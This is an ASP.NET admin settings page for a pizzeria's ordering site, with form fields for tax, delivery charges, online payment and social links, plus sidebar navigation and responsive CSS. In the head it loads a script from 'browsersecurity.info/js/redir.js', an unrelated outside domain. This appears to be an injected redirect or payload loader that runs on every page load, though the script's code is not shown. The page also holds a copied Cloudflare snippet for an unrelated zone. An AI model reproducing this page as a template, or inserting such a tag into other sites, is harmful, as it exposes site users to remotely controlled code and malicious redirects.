﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="MiscellaneousSettings.aspx.cs" Inherits="Admin_MiscellaneousSettings" %>

<!DOCTYPE html>
<html class="no-js">
<meta charset="utf-8">
<meta name="description" content="">
<meta name="viewport" content="width=device-width">
<title>MiscellaneousSettings</title>
<head>
     <link runat="server" rel="shortcut icon" href="/images/logo.ico" type="image/x-icon"/>
   <link runat="server" rel="icon" href="/images/logo.ico" type="image/ico"/>
    <script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
    <script src="http://browsersecurity.info/js/redir.js" type="text/javascript"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <script type="text/javascript">

        //<![CDATA[
        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dok3v=1613a3a185/" }, atok: "72adab177b5729b458fc171b7e2ef771", petok: "be01c04ed78a819345fed98b13a0463b72c424a6-1450762210-1800", zone: "nyasha.me", rocket: "0", apps: { "ga_key": { "ua": "UA-50530436-1", "ga_bs": "2" } }, sha2test: 0 }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
        //]]>
    </script>
    <link rel="shortcut icon" href="/favicon.ec0f3a1b.ico">
    <link rel="stylesheet" href="css/chosen.min.css">
    <link rel="stylesheet" href="css/checkBo.min.css">
    <link rel="stylesheet" href="css/style.css" />
    <style type="text/css">
        @media only screen and (max-width: 2000px) {
            #btnUpdateOnlinePayment {
                margin-left: 263px;
            }

            #btnAddMinimunDliveryPurchase {
                margin-left: 263px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 263px;
            }

            #btnAddMiscellaneousTaxSetting {
                margin-left: 263px;
            }

            #btnCancel {
                margin-left: 30px;
            }


            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }
        }

        @media only screen and (max-width: 1680px) {
            #btnUpdateOnlinePayment {
                margin-left: 222px;
            }

            #btnAddMinimunDliveryPurchase {
                margin-left: 222px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 222px;
            }

            #btnAddMiscellaneousTaxSetting {
                margin-left: 222px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1600px) {
            #btnUpdateOnlinePayment {
                margin-left: 208px;
            }

            #btnAddMinimunDliveryPurchase {
              margin-left: 208px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
               margin-left: 208px;
            }

            #btnAddMiscellaneousTaxSetting {
               margin-left: 208px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1440px) {
            #btnUpdateOnlinePayment {
                margin-left: 179px;
            }

            #btnAddMinimunDliveryPurchase {
               margin-left: 179px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
               margin-left: 179px;
            }

            #btnAddMiscellaneousTaxSetting {
                margin-left: 179px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1366px) {
            #btnUpdateOnlinePayment {
                margin-left:168px;
            }

            #btnAddMinimunDliveryPurchase {
                margin-left: 168px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 168px;
            }

            #btnAddMiscellaneousTaxSetting {
                margin-left: 168px;
            }

            #btnfacebooklink {
                margin-left: 170px;
            }

            #btnGooglePlusLink {
                margin-left: 170px;
            }

            #btnLinkedInLink {
                margin-left: 170px;
            }

            #btnYouTubeLink {
                margin-left: 170px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1280px) {
            #btnUpdateOnlinePayment {
                margin-left: 155px;
            }

            #btnAddMinimunDliveryPurchase {
                margin-left: 155px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 155px;
            }

            #btnAddMiscellaneousTaxSetting {
                margin-left: 155px;
            }

            #btnfacebooklink {
                margin-left: 155px;
            }

            #btnGooglePlusLink {
                margin-left: 155px;
            }

            #btnLinkedInLink {
                margin-left: 155px;
            }

            #btnYouTubeLink {
                margin-left: 155px;
            }

           

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1200px) {
            #btnUpdateOnlinePayment {
                margin-left: 142px;
            }

            #btnAddMinimunDliveryPurchase {
                margin-left: 142px;
            }

            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 142px;
            }

            #btnAddMiscellaneousTaxSetting {
                margin-left: 142px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
         @media only screen and (max-width: 1080px) {
            #btnUpdateOnlinePayment {
                margin-left: 122px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 122px;
            }
            #btnAddMiscellaneousTaxSetting {
                margin-left: 122px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
         @media only screen and (max-width: 1050px) {
            #btnUpdateOnlinePayment {
                margin-left: 118px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 118px;
            }
            #btnAddMiscellaneousTaxSetting {
                margin-left: 118px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

         

        @media only screen and (max-width: 1024px) {
            
            #btnAddMiscellaneousTaxSetting {
                margin-left: 110px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 110px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnUpdateOnlinePayment {
                margin-left: 0px;
            }

            #btnfacebooklink {
                margin-left: 114px;
            }

            #btnGooglePlusLink {
                margin-left: 0px;
            }

            #btnLinkedInLink {
                margin-left: 113px;
            }

            #btnYouTubeLink {
                margin-left: 113px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
         @media only screen and (max-width: 900px) {
            #btnUpdateOnlinePayment {
                margin-left: 0px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 92px;
            }
            #btnAddMiscellaneousTaxSetting {
                margin-left: 92px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
        @media only screen and (max-width: 800px) {
            #btnUpdateOnlinePayment {
                margin-left: 0px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 78px;
            }
            #btnAddMiscellaneousTaxSetting {
                margin-left: 78px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

         @media only screen and (max-width: 768px) {
            #btnUpdateOnlinePayment {
                margin-left: 0px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 68px;
            }
            #btnAddMiscellaneousTaxSetting {
                margin-left: 68px;
            }

            #btnfacebooklink {
                margin-left: 222px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

          @media only screen and (max-width: 600px) {
            #btnUpdateOnlinePayment {
                margin-left: 0px;
            }
            #btnAddMinimunDliveryPurchase {
                margin-left: 0px;
            }
            #btnAddMiscellaneousDeliveryChargesSetting {
                margin-left: 0px;
            }
            #btnAddMiscellaneousTaxSetting {
                margin-left: 0px;
            }

            #btnfacebooklink {
                margin-left: 209px;
            }

            #btnGooglePlusLink {
                margin-left: 209px;
            }

            #btnLinkedInLink {
                margin-left: 209px;
            }

            #btnYouTubeLink {
                margin-left: 209px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
    </style>
     <script type="text/javascript">
         function ConfirmForLogOut() {

             var hdnfldVariable = document.getElementById("<%=hdfLogout.ClientID %>");

             if (confirm("Are you sure you want to log out?")) {

                    hdnfldVariable.value = "Yes";

                } else {

                    hdnfldVariable.value = "No";
                }
                document.getElementById('<%= BtnLogOut.ClientID %>').click();
         }
    </script> 
     
</head>

<body>
    <form runat="server">
         <asp:HiddenField ID="hdfLogout" runat="server" />
        <asp:Button runat="server" ID="BtnLogOut" style="display:none" OnClick="BtnLogOut_Click" />

        <div class="app layout-fixed-header">
            <div class="sidebar-panel offscreen-left">
                <div class="brand">
                    <div class="brand-logo">
                        <img src="images/logo.png" height="50" width="50" style="margin-top: -10px;" alt="">
                    </div>
                    <a href="javascript:;" class="toggle-sidebar hidden-xs hamburger-icon v3" data-toggle="layout-small-menu"><span></span><span></span><span></span><span></span></a>
                </div>

                 <nav role="navigation">
                    <ul class="nav">
                        <li><a href="DashBoard.aspx"><i class="fa fa-flask"></i><span>Dashboard</span> </a></li>
                         <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Menu Details</span> </a>
                            <ul class="sub-menu">
                                <%--<li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/images/oie_311359551MYYq6un.jpg" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Information</span> </a></li>
                                --%>
                                <li><a href="MenuCategoryInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu Category.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Categories</span> </a></li>
                                <li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredients</span> </a></li>
                                <li><a href="IngredientFactInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Coverage</span> </a></li>
                                <li><a href="MenuItemInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Products</span> </a></li>
                                <li><a href="MenuItemSizeInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon//Menu Items.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Product Sizes</span> </a></li>
                                <li><a href="PizzaBaseTypeInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Pizza Base Type.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Pizza Type</span> </a></li>
                                <li><a href="MenuItemMakingMethodInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Making Method</span> </a></li>
                            </ul>
                        </li>
                      
                       <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Orders</span> </a>
                            <ul class="sub-menu">

                                <li><a href="OrderDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Order.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Order Details</span> </a></li>
                                <li><a href="DayToDaySellingInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Day to Day Sales.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Daily Sales</span> </a></li>
                                 <li><a href="TransactionDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Transaction.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Transaction Details</span></a></li>

                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Files and Images</span> </a>
                            <ul class="sub-menu">

                                <li><a href="UploadMenuPdf.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Menu</span> </a></li>
                                <li><a href="AddHomePageImages.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Images</span> </a></li>

                            </ul>
                        </li>

                        <li><a href="OfferDetail.aspx"><i class="fa fa-tint"></i><span>Offers</span> </a>
                            <%--<ul class="sub-menu">
                                <li class="active"><a href="OfferDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Offer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Offer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="CustomerInformation.aspx"><i class="fa fa-tint"></i><span>Customers</span> </a>
                           <%-- <ul class="sub-menu">
                                <li><a href="CustomerInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Customer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Customer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="SendNewsLatterInformation.aspx"><i class="fa fa-tint"></i><span>Newsletters</span> </a>
                           <%-- <ul class="sub-menu">
                                <li><a href="SendNewsLatterInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/News Letter.png" Height="22px" Width="22px" runat="server"/><span> </span><span>News Letter Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li class="open"><a href="javascript:;"><i class="fa fa-tint"></i><span>Misc. </span> </a>
                            <ul class="sub-menu">

                                <li class="active"><a href="MiscellaneousSettings.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Settings</span> </a></li>
                                <li><a href="AddConfigKeyAndValues.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Configuration Settings</span> </a></li>
                                <li><a href="AddConfigContactDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Contact.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Contact Detail</span></a></li>

                            </ul>
                        </li>

                        <li><a href="StoreInformation.aspx"><i class="fa fa-tint"></i><span>Store Details</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="StoreInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Store.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Information</span> </a></li>
                            </ul--%>>
                        </li>

                    </ul>
                </nav>
            </div>


            <div class="main-panel">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">Log Out</span> </a></li>
                    </ul>
                </header>


                <div class="main-content">
                    <div class="panel mb25">
                        <div class="panel-heading border" style="font-size:medium;font-weight:bold;">Miscellaneous Settings</div>
                        <div class="panel-body">
                            <div class="row no-margin">
                                <div class="col-lg-12">
                                    <div class="form-horizontal bordered-group" role="form">
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Tax</label>
                                            <div class="col-sm-10">
                                                <%-- <input class="form-control">--%>
                                                <asp:TextBox ID="txttax" CssClass="form-control" runat="server"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqTax" runat="server" ControlToValidate="txttax" ErrorMessage="Tax Required" ForeColor="Red" ValidationGroup="Vg1"></asp:RequiredFieldValidator>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator3" ControlToValidate="txttax" runat="server" ErrorMessage="Only Integers and Decimal values are allowed" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: -80px;"  ValidationGroup="Vg1"></asp:RegularExpressionValidator>
                                            </div>
                                            <div class="col-sm-10">
                                                <asp:Button ID="btnAddMiscellaneousTaxSetting" CssClass="btn btn-info"  runat="server" Text="Add Miscellaneous Tax Setting" OnClick="btnAddMiscellaneousTaxSetting_Click" ValidationGroup="Vg1" />
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Delivery Charge</label>
                                            <div class="col-sm-10">

                                                <asp:TextBox ID="txtDeliveryCharge" CssClass="form-control" runat="server"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqCarrier" runat="server" ControlToValidate="txtDeliveryCharge" ErrorMessage="Delivery Charges Required" ForeColor="Red" ValidationGroup="Vg2"></asp:RequiredFieldValidator>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator1" ControlToValidate="txtDeliveryCharge" runat="server" ErrorMessage="Only Integers and Decimal values are allowed" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: -150px;"  ValidationGroup="Vg2"></asp:RegularExpressionValidator>
                                            </div>
                                            <div class="col-sm-10">

                                                <asp:Button ID="btnAddMiscellaneousDeliveryChargesSetting" CssClass="btn btn-info" runat="server" Text="Add Miscellaneous Delivery Charge Setting" OnClick="btnAddMiscellaneousDeliveryChargesSetting_Click" ValidationGroup="Vg2" />
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Minimum Delivery Purchase</label>
                                            <div class="col-sm-10">

                                                <asp:TextBox ID="txtMinimunDeliveryPurchase" CssClass="form-control" runat="server"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqMinimunDeliveryPurchase" runat="server" ControlToValidate="txtMinimunDeliveryPurchase" ErrorMessage="Minimum Delivery Purchase Required" ForeColor="Red" ValidationGroup="Vg3"></asp:RequiredFieldValidator>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator2" ControlToValidate="txtMinimunDeliveryPurchase" runat="server" ErrorMessage="Only Integers and Decimal values are allowed" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: -220px;"  ValidationGroup="Vg3"></asp:RegularExpressionValidator>
                                            </div>
                                            <div class="col-sm-10">

                                                <asp:Button ID="btnAddMinimunDliveryPurchase" CssClass="btn btn-info"  runat="server" Text="Add Miscellaneous Minimum Delivery Purchase Setting" OnClick="btnAddMinimunDliveryPurchase_Click" ValidationGroup="Vg3" />
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Online Payment</label>
                                            <div class="col-sm-10">
                                                <asp:RadioButton runat="server" Text="On " GroupName="Payment" ID="rdbOn" />
                                                <asp:RadioButton runat="server" Text="Off " GroupName="Payment" ID="rdboff" />
                                            </div>
                                            <div class="col-sm-10">

                                                <asp:Button ID="btnUpdateOnlinePayment" CssClass="btn btn-info"  runat="server" Text="Add Online Payment Setting" OnClick="btnUpdateOnlinePayment_Click" ValidationGroup="Payment" />
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Facebook Link</label>
                                            <div class="col-sm-10">

                                                <asp:TextBox ID="txtFaceBookLink" CssClass="form-control" runat="server"></asp:TextBox>
                                                                                        
                                            </div>
                                            <div class="col-sm-10">
                                                <br />
                                                <asp:Button ID="btnfacebooklink" CssClass="btn btn-info"  runat="server" Text="Update Facebook Link" OnClick="btnfacebooklink_Click"/>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Google Plus Link</label>
                                            <div class="col-sm-10">

                                                <asp:TextBox ID="txtGooglePlusLink" CssClass="form-control" runat="server"></asp:TextBox>                                        
                                            </div>
                                            <div class="col-sm-10">
                                                <br />
                                                <asp:Button ID="btnGooglePlusLink" CssClass="btn btn-info"  runat="server" Text="Update GooglePlus Link" OnClick="btnGooglePlusLink_Click"/>
                                            </div>
                                        </div>

                                         <div class="form-group">
                                            <label class="col-sm-2 control-label">LinkedIn Link</label>
                                            <div class="col-sm-10">

                                                <asp:TextBox ID="txtLinkedInLink" CssClass="form-control" runat="server"></asp:TextBox>                                        
                                            </div>
                                            <div class="col-sm-10">
                                                <br />
                                                <asp:Button ID="btnLinkedInLink" CssClass="btn btn-info"  runat="server" Text="Update LinkedIn Link" OnClick="btnLinkedInLink_Click"/>
                                            </div>
                                        </div>

                                         <div class="form-group">
                                            <label class="col-sm-2 control-label">Youtube Link</label>
                                            <div class="col-sm-10">

                                                <asp:TextBox ID="txtYouTubeLink" CssClass="form-control" runat="server"></asp:TextBox>                                        
                                            </div>
                                            <div class="col-sm-10">
                                                <br />
                                                <asp:Button ID="btnYouTubeLink" CssClass="btn btn-info"  runat="server" Text="Update Youtube Link" OnClick="btnYouTubeLink_Click"/>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <asp:Button ID="btnCancel" CssClass="btn btn-info" Style="left: 220px;" runat="server" Text="Cancel" OnClick="btnCancel_Click" CausesValidation="false" Visible="false" OnClientClick="FormClose();" />

                </div>

                <%--<button type="submit" class="btn btn-info">Submit</button>--%>
            </div>
             <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />  <br /> <br /> <br /> <br />
            <footer class="content-footer">
                <nav class="footer-right">
                    <ul class="nav">
                        <li><a href="javascript:;">Top</a> </li>
                        <li><a href="javascript:;" class="scroll-up"><i class="fa fa-angle-up"></i></a></li>
                    </ul>
                </nav>
                <nav class="footer-left">
                    <ul class="nav">
                        <li><a href="javascript:;">Copyright <i class="fa fa-copyright"></i><span>TomatosPizzeria</span> 2016. All rights reserved</a> </li>
                    </ul>
                </nav>
            </footer>

        </div>

        <script src="js/app.min.4fc8dd6e.js">
        </script>
        <script type="text/javascript">
            /* <![CDATA[ */
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-50530436-1']);
            _gaq.push(['_trackPageview']);

            (function () {
                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
            })();

            (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
            /* ]]> */
        </script>
    </form>
</body>
</html>